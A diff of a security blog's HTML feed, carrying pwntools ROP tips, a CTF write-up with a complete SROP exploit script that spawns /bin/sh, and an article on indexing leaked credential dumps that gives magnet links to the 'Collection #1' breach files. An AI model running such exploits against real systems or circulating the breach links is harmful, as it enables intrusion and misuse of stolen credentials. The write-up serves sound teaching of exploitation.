+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-plaintext" data-lang="plaintext">NAME
        mprotect — set protection of memory mapping
 
 SYNOPSIS
@@ -294,7 +1151,7 @@ arguments to the callee as a list. The function doesn&rsquo;t return anything, b
 instance of the ROP class. This allows for you to continue to chain more calls together. Once
 you&rsquo;re ready, you can <code>bytes(rop)</code> or <code>rop.chain()</code> to get the resulting payload. As a convenience,
 symbols are also directly callable from the <code>ROP</code> instance.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">In [<span style="color:#ae81ff">1</span>]: <span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">In [<span style="color:#ae81ff">1</span>]: <span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
 In [<span style="color:#ae81ff">2</span>]: context<span style="color:#f92672">.</span>arch <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;amd64&#34;</span>
 In [<span style="color:#ae81ff">3</span>]: rop <span style="color:#f92672">=</span> ROP(<span style="color:#e6db74">&#39;./haxme&#39;</span>)
 
@@ -303,7 +1160,7 @@ Out[<span style="color:#ae81ff">4</span>]: <span style="color:#e6db74">&#39;&#39
 
 In [<span style="color:#ae81ff">5</span>]: rop<span style="color:#f92672">.</span>call(<span style="color:#e6db74">&#39;mprotect&#39;</span>, [<span style="color:#ae81ff">0x12345678</span>, <span style="color:#ae81ff">0x1000</span>, <span style="color:#ae81ff">0x7</span>])
 
-In [<span style="color:#ae81ff">6</span>]: <span style="color:#66d9ef">print</span>(rop<span style="color:#f92672">.</span>dump())
+In [<span style="color:#ae81ff">6</span>]: print(rop<span style="color:#f92672">.</span>dump())
 <span style="color:#ae81ff">0x0000</span>:         <span style="color:#ae81ff">0x43e369</span> pop rdx; pop rsi; ret
 <span style="color:#ae81ff">0x0008</span>:              <span style="color:#ae81ff">0x7</span> [arg2] rdx <span style="color:#f92672">=</span> <span style="color:#ae81ff">7</span>
 <span style="color:#ae81ff">0x0010</span>:           <span style="color:#ae81ff">0x1000</span> [arg1] rsi <span style="color:#f92672">=</span> <span style="color:#ae81ff">4096</span>
@@ -313,7 +1170,7 @@ In [<span style="color:#ae81ff">6</span>]: <span style="color:#66d9ef">print</sp
 
 In [<span style="color:#ae81ff">7</span>]: rop<span style="color:#f92672">.</span>read(<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0x1234</span>, <span style="color:#ae81ff">0x100</span>)
 
-In [<span style="color:#ae81ff">8</span>]: <span style="color:#66d9ef">print</span>(rop<span style="color:#f92672">.</span>dump())
+In [<span style="color:#ae81ff">8</span>]: print(rop<span style="color:#f92672">.</span>dump())
 <span style="color:#ae81ff">0x0000</span>:         <span style="color:#ae81ff">0x43e369</span> pop rdx; pop rsi; ret
 <span style="color:#ae81ff">0x0008</span>:              <span style="color:#ae81ff">0x7</span> [arg2] rdx <span style="color:#f92672">=</span> <span style="color:#ae81ff">7</span>
 <span style="color:#ae81ff">0x0010</span>:           <span style="color:#ae81ff">0x1000</span> [arg1] rsi <span style="color:#f92672">=</span> <span style="color:#ae81ff">4096</span>
@@ -334,7 +1191,7 @@ robust as something like
 <a href="https://github.com/sashs/Ropper">ropper</a>.
 That said, it&rsquo;s still a very helpful and useful function. <code>gadgets</code> contains your dict of gadget
 objects and <code>find_gadget</code> is simply a convenience methods for searching the <code>gadgets</code> dict.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">In [<span style="color:#ae81ff">1</span>]: <span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">In [<span style="color:#ae81ff">1</span>]: <span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
 In [<span style="color:#ae81ff">2</span>]: rop <span style="color:#f92672">=</span> ROP(<span style="color:#e6db74">&#39;./haxme&#39;</span>)
 
 In [<span style="color:#ae81ff">3</span>]: len(rop<span style="color:#f92672">.</span>gadgets)
@@ -345,7 +1202,7 @@ In [<span style="color:#ae81ff">5</span>]: gdt
 Out[<span style="color:#ae81ff">5</span>]: Gadget(<span style="color:#ae81ff">0x4006ab</span>, [<span style="color:#e6db74">u</span><span style="color:#e6db74">&#39;pop rsi&#39;</span>, <span style="color:#e6db74">u</span><span style="color:#e6db74">&#39;pop r15&#39;</span>, <span style="color:#e6db74">u</span><span style="color:#e6db74">&#39;pop rbp&#39;</span>, <span style="color:#e6db74">u</span><span style="color:#e6db74">&#39;ret&#39;</span>], [<span style="color:#e6db74">u</span><span style="color:#e6db74">&#39;rsi&#39;</span>, <span style="color:#e6db74">u</span><span style="color:#e6db74">&#39;r15&#39;</span>, <span style="color:#e6db74">u</span><span style="color:#e6db74">&#39;rbp&#39;</span>], <span style="color:#ae81ff">0x10</span>)
 
 In [<span style="color:#ae81ff">6</span>]: gdt<span style="color:#f92672">.</span>address
-Out[<span style="color:#ae81ff">6</span>]: <span style="color:#ae81ff">4196011L</span>
+Out[<span style="color:#ae81ff">6</span>]: <span style="color:#ae81ff">4196011</span>L
 </code></pre></div><h3 id="srop">SROP</h3>
 <p>When attempting to call something like <code>mprotect</code> in a binary that doesn&rsquo;t explicitly have a symbol
 for it, <code>pwntools</code> will attempt a syscall instead, using SIGRET/SROP. I&rsquo;ve written about this
@@ -378,7 +1235,7 @@ remote box in order to be able to search for the right version.</p>
 <p>Once you&rsquo;ve identified which <code>libc</code> is on the remote server, you can take its buildid or hash and
 pop it into pwntools. Then you can start rop-chaining or symbol searching right from the comfort of
 your exploit script.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">leaked_got_read <span style="color:#f92672">=</span> leak_read()
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">leaked_got_read <span style="color:#f92672">=</span> leak_read()
 exe <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#39;pwnable&#39;</span>)
 
 <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#34;remote&#34;</span> <span style="color:#f92672">not</span> <span style="color:#f92672">in</span> sys<span style="color:#f92672">.</span>argv:
@@ -391,13 +1248,13 @@ libc_base <span style="color:#f92672">=</span> leaked_got_read  <span style="col
 </code></pre></div><p>Debug log output during script execution shows that pwntools is handling the file download and
 caching for you.</p>
 <p>First run:</p>
-<pre><code class="language-log" data-lang="log">[DEBUG] Downloading data from LibcDB: https://gitlab.com/libcdb/libcdb/raw/master/hashes/md5/50390b2ae8aaa73c47745040f54e602f
+<pre tabindex="0"><code class="language-log" data-lang="log">[DEBUG] Downloading data from LibcDB: https://gitlab.com/libcdb/libcdb/raw/master/hashes/md5/50390b2ae8aaa73c47745040f54e602f
 [+] Downloading 'https://gitlab.com/libcdb/libcdb/raw/master/hashes/md5/50390b2ae8aaa73c47745040f54e602f': 70B
 
 [DEBUG] Downloading data from LibcDB: https://gitlab.com/libcdb/libcdb/raw/master/libc/libc6_2.27-3ubuntu1_amd64/lib/x86_64-linux-gnu/libc-2.27.so
 [+] Downloading 'https://gitlab.com/libcdb/libcdb/raw/master/libc/libc6_2.27-3ubuntu1_amd64/lib/x86_64-linux-gnu/libc-2.27.so': 1.94MB
 </code></pre><p>Second run:</p>
-<pre><code class="language-log" data-lang="log">[DEBUG] Found existing cached libc at '/home/red/.pwntools-cache/libcdb/md5/50390b2ae8aaa73c47745040f54e602f'
+<pre tabindex="0"><code class="language-log" data-lang="log">[DEBUG] Found existing cached libc at '/home/red/.pwntools-cache/libcdb/md5/50390b2ae8aaa73c47745040f54e602f'
 [*] Using cached data from '/home/red/.pwntools-cache/libcdb/md5/50390b2ae8aaa73c47745040f54e602f'
 </code></pre><p>That&rsquo;s all for today&rsquo;s Pwntools quick tips!</p>
 ]]></content>
@@ -430,7 +1287,7 @@ in a manner that places you in a more advantageous position during your exploit.
 <p>The challenge was a very small binary, hand written in assembly. The stack was not executable (NX),
 and even if you had gadgets, there&rsquo;s nowhere all that useful to jump.</p>
 <p>Here&rsquo;s the <code>strace</code>:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">❯❯ strace ./pwn
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">❯❯ strace ./pwn
 execve<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;./pwn&#34;</span>, <span style="color:#f92672">[</span><span style="color:#e6db74">&#34;./pwn&#34;</span><span style="color:#f92672">]</span>, 0x7ffcfe4a4a50 /* <span style="color:#ae81ff">57</span> vars */<span style="color:#f92672">)</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
 read<span style="color:#f92672">(</span>0, AAAAAAA
 <span style="color:#e6db74">&#34;AAAAAAA\n&#34;</span>, 300<span style="color:#f92672">)</span>               <span style="color:#f92672">=</span> <span style="color:#ae81ff">8</span>
@@ -439,7 +1296,7 @@ write<span style="color:#f92672">(</span>1, <span style="color:#e6db74">&#34;AAA
 exit<span style="color:#f92672">(</span>1<span style="color:#f92672">)</span>                                 <span style="color:#f92672">=</span> ?
 </code></pre></div><p>So it just echos back what we type at it.</p>
 <p>Here&rsquo;s the complete assembly (with comments by me):</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-nasm" data-lang="nasm">
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-nasm" data-lang="nasm">
 _start:           <span style="color:#75715e">; 0x400000</span>
 <span style="color:#a6e22e">push</span>   <span style="color:#ae81ff">0x40101e</span>   <span style="color:#75715e">; push _write</span>
 <span style="color:#a6e22e">mov</span>    edi,<span style="color:#ae81ff">0x0</span>    <span style="color:#75715e">; 1st arg to the upcoming syscall. read from FD 0, STDIN</span>
@@ -468,7 +1325,7 @@ _exit:            <span style="color:#75715e">; 0x40103c</span>
 that our buffer is 8 bytes. We can determine that by either looking at the assembly or with the
 traditional pattern create/query. We&rsquo;ll also need know the binary&rsquo;s security measures. The remote
 box has ASLR enabled, which we would have found later; we&rsquo;ll proceed with that as a given.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">pwndbg&gt; checksec
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">pwndbg&gt; checksec
 <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> <span style="color:#e6db74">&#39;/home/terrance/Dropbox/Blogs/security/content/post/minipwn/pwn/pwn&#39;</span>
     Arch:     amd64-64-little
     RELRO:    No RELRO
@@ -508,7 +1365,7 @@ binary some more data.</li>
 exploit-writing library for Python. I&rsquo;ll be trying to use as few &lsquo;magic&rsquo; numbers as possible and
 use the library to its fullest potential.</p>
 <p>This is the skeleton I&rsquo;m going to start with:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">
 <span style="color:#75715e">#!/usr/bin/env python</span>
 
 <span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
@@ -537,7 +1394,7 @@ BIN <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;./pwn&
     <span style="color:#66d9ef">else</span>:
         log<span style="color:#f92672">.</span>error(<span style="color:#e6db74">&#34;Run mode missing: [debug, local, remote &lt;server&gt; &lt;port&gt;]&#34;</span>)
 
-    log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#34;Run mode: {}&#34;</span><span style="color:#f92672">.</span>format(opt))
+    log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#34;Run mode: </span><span style="color:#e6db74">{}</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>format(opt))
     <span style="color:#66d9ef">return</span> io
 
 <span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;__main__&#34;</span>:
@@ -552,7 +1409,7 @@ BIN <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;./pwn&
 </span><span style="color:#e6db74">    EXPLOIT CODE GOES HERE
 </span><span style="color:#e6db74">    &#34;&#34;&#34;</span>
 </code></pre></div><p>We can start by declaring some constants that we&rsquo;ll need for the exploit. Let&rsquo;s get some info first:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">pwndbg&gt; disass _start
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">pwndbg&gt; disass _start
 Dump of assembler code <span style="color:#66d9ef">for</span> <span style="color:#66d9ef">function</span> _start:
    0x0000000000401000 &lt;+0&gt;:     push   0x40101e
    0x0000000000401005 &lt;+5&gt;:     mov    edi,0x0
@@ -574,7 +1431,7 @@ Dump of assembler code <span style="color:#66d9ef">for</span> <span style="color
    0x0000000000401039 &lt;+27&gt;:    syscall
    0x000000000040103b &lt;+29&gt;:    ret
 </code></pre></div><p>From here, we generate our address constants:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">syscall   <span style="color:#f92672">=</span> elf<span style="color:#f92672">.</span>sym<span style="color:#f92672">.</span>_start <span style="color:#f92672">+</span> <span style="color:#ae81ff">27</span> <span style="color:#75715e"># 0x401016</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">syscall   <span style="color:#f92672">=</span> elf<span style="color:#f92672">.</span>sym<span style="color:#f92672">.</span>_start <span style="color:#f92672">+</span> <span style="color:#ae81ff">27</span> <span style="color:#75715e"># 0x401016</span>
 ret2read  <span style="color:#f92672">=</span> elf<span style="color:#f92672">.</span>sym<span style="color:#f92672">.</span>_start <span style="color:#f92672">+</span> <span style="color:#ae81ff">22</span> <span style="color:#75715e"># 0x401016</span>
 ret2write <span style="color:#f92672">=</span> elf<span style="color:#f92672">.</span>sym<span style="color:#f92672">.</span>_write <span style="color:#f92672">+</span> <span style="color:#ae81ff">17</span> <span style="color:#75715e"># 0x40102f</span>
 _start    <span style="color:#f92672">=</span> elf<span style="color:#f92672">.</span>sym<span style="color:#f92672">.</span>_start <span style="color:#f92672">+</span> <span style="color:#ae81ff">5</span>  <span style="color:#75715e"># we want to skip pushing _write to the stack</span>
@@ -583,7 +1440,7 @@ OFFSET <span style="color:#f92672">=</span> <span style="color:#ae81ff">8</span>
 SIGRET_FRAME_SIZE <span style="color:#f92672">=</span> <span style="color:#ae81ff">248</span>
 SLEEP <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>
 </code></pre></div><p>Building our first overwrite of the stack:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#e6db74">&#34;&#34;&#34;
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#e6db74">&#34;&#34;&#34;
 </span><span style="color:#e6db74">Overflow the next two return addresses:
 </span><span style="color:#e6db74">
 </span><span style="color:#e6db74">First, ret to (mov eax,0x1) to cause a write syscall. Doing this
@@ -601,7 +1458,7 @@ data <span style="color:#f92672">+=</span> p64(ret2write) <span style="color:#75
 data <span style="color:#f92672">+=</span> p64(_start)    <span style="color:#75715e"># Reset</span>
 p<span style="color:#f92672">.</span>send(data)
 </code></pre></div><p>Now we deal with the data that we&rsquo;ve forced the application to echo back to us:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#e6db74">&#34;&#34;&#34;
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#e6db74">&#34;&#34;&#34;
 </span><span style="color:#e6db74">The 4th giant-word is an environment variable pointer.
 </span><span style="color:#e6db74">&#39;&amp;&#39; it with 0xfffffffffffff000 to find the beginning of the page.
 </span><span style="color:#e6db74">This is our new, known base/offset that remains consistent between
@@ -612,7 +1469,7 @@ pointer <span style="color:#f92672">=</span> leaks[<span style="color:#ae81ff">3
 stack_leak <span style="color:#f92672">=</span> u64(pointer) <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xfffffffffffff000</span>
 log<span style="color:#f92672">.</span>warn(<span style="color:#e6db74">&#39;leaked stack: &#39;</span> <span style="color:#f92672">+</span> hex(stack_leak))
 </code></pre></div><p>We can create a function that will generate us our SIGRET frame to keep the code a little cleaner:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">
 <span style="color:#e6db74">&#34;&#34;&#34;
 </span><span style="color:#e6db74">Build a SIGRETURN SYS_read frame that reads 2000 bytes.
 </span><span style="color:#e6db74">&#34;&#34;&#34;</span>
@@ -644,7 +1501,7 @@ data <span style="color:#f92672">+=</span> sigreturn_read(stack_leak)
 p<span style="color:#f92672">.</span>send(data)
 </code></pre></div><p>Now we trigger the SIGRET by sending 15 bytes (remember the SIGRET number is 15 and the return
 value of <code>SYS_read</code> is the number of bytes read, and this return value gets stored in RAX)</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#e6db74">&#34;&#34;&#34;
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#e6db74">&#34;&#34;&#34;
 </span><span style="color:#e6db74">Trigger SIGRETURN by sending 15 bytes to the binary when it&#39;s
 </span><span style="color:#e6db74">reading, which sets RAX to 15. When execution meets a syscall
 </span><span style="color:#e6db74">instruction, the frame above will replace all the register values
@@ -653,7 +1510,7 @@ log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#34;Tri
 pause(SLEEP)
 p<span style="color:#f92672">.</span>send(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;B&#39;</span> <span style="color:#f92672">*</span> constants<span style="color:#f92672">.</span>SYS_rt_sigreturn)
 </code></pre></div><p>The SIGRET frame we built earlier has now been pulled into the registers.</p>
-<pre><code>rax = 0 # SYS_read
+<pre tabindex="0"><code>rax = 0 # SYS_read
 rdi = 0 # STDIN File Descriptor
 rsi = our calculated page-start address
 rdx = 2000 # arg to sys_READ for how many bytes to read
@@ -664,7 +1521,7 @@ our now known stack-base, we can now build out our own stack and track our own o
 up another SYS_read which will read 15 bytes to set RAX and then ret to a syscall to trigger the
 SIGRETURN. We can calculate where the end of the payload (previous 2 instruction plus our custom
 stack frame) will be. Once triggered, <code>/bin/sh</code> will be at RSP.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#e6db74">&#34;&#34;&#34;
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#e6db74">&#34;&#34;&#34;
 </span><span style="color:#e6db74">Build a SYS_execve SIGRETURN frame that will execute /bin/sh
 </span><span style="color:#e6db74">The binsh address in the stack will eventually hold &#39;/bin/sh&#39;
 </span><span style="color:#e6db74">followed by a pointer to null, followed by a pointer to binsh&#39;s
@@ -714,7 +1571,7 @@ p<span style="color:#f92672">.</span>send(<span style="color:#e6db74">b</span><s
 p<span style="color:#f92672">.</span>interactive()
 
 </code></pre></div><p>That should be all we need. When we run our final payload, we get:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">❯❯ python minipwn.py local
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">❯❯ python minipwn.py local
 <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> <span style="color:#e6db74">&#39;/home/terrance/Dropbox/Blogs/security/content/post/minipwn/pwn/pwn&#39;</span>
     Arch:     amd64-64-little
     RELRO:    No RELRO
@@ -738,7 +1595,7 @@ terrance
 $
 </code></pre></div><p>Works on my machine! Well, let&rsquo;s test it &ldquo;remote&rdquo;. Here&rsquo;s the CTF&rsquo;s Dockerfile which will set up
 the challenge for remote pwning. You can tie the binary together with netcat or socat as well.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-dockerfile" data-lang="dockerfile"><span style="color:#66d9ef">FROM</span><span style="color:#e6db74"> alpine:latest</span><span style="color:#960050;background-color:#1e0010">
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-dockerfile" data-lang="dockerfile"><span style="color:#66d9ef">FROM</span><span style="color:#e6db74"> alpine:latest</span><span style="color:#960050;background-color:#1e0010">
 </span><span style="color:#960050;background-color:#1e0010">
 </span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">RUN</span> mkdir /app<span style="color:#960050;background-color:#1e0010">
 </span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">COPY</span> pwn /app/<span style="color:#960050;background-color:#1e0010">
@@ -750,10 +1607,10 @@ the challenge for remote pwning. You can tie the binary together with netcat or 
 </span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">WORKDIR</span><span style="color:#e6db74"> /app/</span><span style="color:#960050;background-color:#1e0010">
 </span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">ENTRYPOINT</span> [<span style="color:#e6db74">&#34;nc&#34;</span>, <span style="color:#e6db74">&#34;-lkvp&#34;</span>, <span style="color:#e6db74">&#34;1337&#34;</span>, <span style="color:#e6db74">&#34;-e&#34;</span>, <span style="color:#e6db74">&#34;/app/pwn&#34;</span>]<span style="color:#960050;background-color:#1e0010">
 </span></code></pre></div><p>Run with:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">docker build -t minipwn .
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">docker build -t minipwn .
 docker run -p 1337:1337 --rm minipwn
 </code></pre></div><p>Then test the exploit remotely:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">❯❯ python minipwn.py remote 172.17.0.1 <span style="color:#ae81ff">1337</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">❯❯ python minipwn.py remote 172.17.0.1 <span style="color:#ae81ff">1337</span>
 <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Opening connection to 172.17.0.1 on port 1337: Done
 <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Run mode: remote
 <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Opening connection to 172.17.0.1 on port 1337: Done
@@ -802,7 +1659,7 @@ with manipulating large amounts of data, prepare to cringe&hellip; HARD</p>
 <p>If you&rsquo;re just interested in some stats and bencharks, you can
 <a href="#benchmarks-and-data">skip straight to that section</a></p>
 <p>If you&rsquo;d like to play along, here are some magnet links to the dumps.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt"># Collection #1
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt"># Collection #1
 magnet:?xt=urn:btih:b39c603c7e18db8262067c5926e7d5ea5d20e12e&amp;dn=Collection+1
 
 # Collections #2 - #5
@@ -821,7 +1678,7 @@ searching we all think: DATABASES!</p>
 results. We can decide, then,  to incur the costs of writing to a heavily-indexed database up
 front, while seeding the databse. Let&rsquo;s get <em>normalized</em>.</p>
 <p>The records in these types of dumps are generally structured like so:</p>
-<pre><code>username@domain.com:P@ssw0rd!
+<pre tabindex="0"><code>username@domain.com:P@ssw0rd!
 </code></pre><p>Let&rsquo;s start by splitting each record into tables <code>usernames</code>, <code>domains</code>, and <code>passwords</code>.
 We can also create a <code>records</code> table with foreign keys which will maintain the relationship between
 entires in the other 3 tables. Also, if we create a unique index on the combination of the foreign
@@ -830,7 +1687,7 @@ keys in the <code>records</code> table, we ensure that only one combination of <
 dumps, the string &ldquo;gmail.com&rdquo; is only stored once. This kind of data normalization is what
 databases are meant for.</p>
 <p>With this configuration, if we seed our database with the following records:</p>
-<pre><code>jerry@gmail.com:Summer19
+<pre tabindex="0"><code>jerry@gmail.com:Summer19
 adam@gmail.com: Summer19
 samantha@yahoo.com:Summer19
 samantha@yandex.ru:Password123
@@ -952,14 +1809,14 @@ concept of a struct/class/object and map its properties to a database table. For
 have a <code>Dog</code> class in our language, an ORM maps this class to a <code>dogs</code> table in our database. Once
 we create an instance of that dog class, <code>starbuck = Dog.new</code>, <code>starbuck</code> now represents a single
 row in the <code>dogs</code> table. Columns, then, are mapped to properties of an instance.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-ruby" data-lang="ruby">starbuck <span style="color:#f92672">=</span> <span style="color:#66d9ef">Dog</span><span style="color:#f92672">.</span>create(name: <span style="color:#e6db74">&#39;Starbuck&#39;</span>)
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-ruby" data-lang="ruby">starbuck <span style="color:#f92672">=</span> <span style="color:#66d9ef">Dog</span><span style="color:#f92672">.</span>create(name: <span style="color:#e6db74">&#39;Starbuck&#39;</span>)
 <span style="color:#f92672">=&gt;</span> <span style="color:#66d9ef">Dog</span><span style="color:#f92672">&lt;</span>id: <span style="color:#ae81ff">1</span>, name: <span style="color:#e6db74">&#39;Starbuck&#39;</span><span style="color:#f92672">&gt;</span>
 
 starbuck<span style="color:#f92672">.</span>name
 <span style="color:#f92672">=&gt;</span> <span style="color:#e6db74">&#34;Starbuck&#34;</span>
 </code></pre></div><p>When calling <code>starbuck.name</code>, the ORM&rsquo;s query planner will generate and issue the following query to
 the underlying SQL engine:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql"><span style="color:#66d9ef">SELECT</span> name 
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql"><span style="color:#66d9ef">SELECT</span> name 
 <span style="color:#66d9ef">FROM</span> dogs
 <span style="color:#66d9ef">WHERE</span> <span style="color:#e6db74">&#39;id&#39;</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>
 
@@ -972,7 +1829,7 @@ line of business logic.</p>
 <p>Another reason I chose ActiveRecord was its ease of configuration. The following blocks of code
 are all that&rsquo;s needed to enable queries that can ordinarily be cumbersome to write.</p>
 <h3 id="configuring-data-models">Configuring data models</h3>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-ruby" data-lang="ruby">require <span style="color:#e6db74">&#39;active_record&#39;</span>
